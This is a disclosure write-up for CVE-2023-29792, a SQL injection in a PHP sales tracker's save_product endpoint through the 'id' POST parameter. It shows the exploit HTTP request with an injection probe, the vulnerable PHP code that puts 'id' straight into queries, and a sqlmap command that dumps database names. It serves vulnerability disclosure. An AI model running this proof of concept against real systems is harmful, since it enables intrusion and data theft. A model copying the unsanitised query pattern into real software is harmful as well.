# CVE-2023-29792

Download sourcecode from https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html

Deploy the system

The sql injection url: http://127.0.0.1/php-sts/classes/Master.php?f=save_product Vulnerability trigger parameter: id(post parameter)

The http message is 

```
POST /php-sts/classes/Master.php?f=save_product HTTP/1.1
Host: 172.31.171.96
Content-Length: 620
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbc4qHZLzr0zBDjL
Origin: http://172.31.171.96
Referer: http://172.31.171.96/php-sts/admin/?page=products
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _identity-backend=1416da550bcea012a11350a0ee7d79cf245e88d2bb9d4d2aa1f1074044ab7943a%3A2%3A%7Bi%3A0%3Bs%3A17%3A%22_identity-backend%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22z6lrwixmdNF4VqtkXw6z-3vMZdSdngm2%22%2C2592000%5D%22%3B%7D; PHPSESSID=qj7s632jgajmvubq5d9g49fnnn
Connection: close

------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="id"

1 and 1=1
------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="code"

123
------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="name"

123
------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="description"

123
------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="price"

123
------WebKitFormBoundaryAbc4qHZLzr0zBDjL
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryAbc4qHZLzr0zBDjL--

```

sourcecode:

```php
	function save_product(){
		extract($_POST);
		$data = "";
		foreach($_POST as $k =>$v){
			if(!in_array($k,array('id'))){
				if(!empty($data)) $data .=",";
				$v = htmlspecialchars($this->conn->real_escape_string($v));
				$data .= " `{$k}`='{$v}' ";
			}
		}
		$check = $this->conn->query("SELECT * FROM `product_list` where `code` = '{$code}' and delete_flag = 0 ".(!empty($id) ? " and id != {$id} " : "")." ")->num_rows;
		if($this->capture_err())
			return $this->capture_err();
		if($check > 0){
			$resp['status'] = 'failed';
			$resp['msg'] = "Product Code already exists. Code must be unique";
			return json_encode($resp);
			exit;
		}
		if(empty($id)){
			$sql = "INSERT INTO `product_list` set {$data} ";
		}else{
			$sql = "UPDATE `product_list` set {$data} where id = '{$id}' ";
		}
			$save = $this->conn->query($sql);
		if($save){
			$cid = !empty($id) ? $id : $this->conn->insert_id;
			$resp['cid'] = $cid;
			$resp['status'] = 'success';
			if(empty($id))
				$resp['msg'] = "New Product successfully saved.";
			else
				$resp['msg'] = " Product successfully updated.";
		}else{
			$resp['status'] = 'failed';
			$resp['err'] = $this->conn->error."[{$sql}]";
		}
		// if($resp['status'] == 'success')
		// 	$this->settings->set_flashdata('success',$resp['msg']);
			return json_encode($resp);
	}
```

![sourcecode](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310202421828.png)

sqlmap command: sqlmap -r /mnt/d/web_temp/sqlattack.txt -pid --batch --dbs

![1](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310202856402.png)

![2](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310202937055.png)
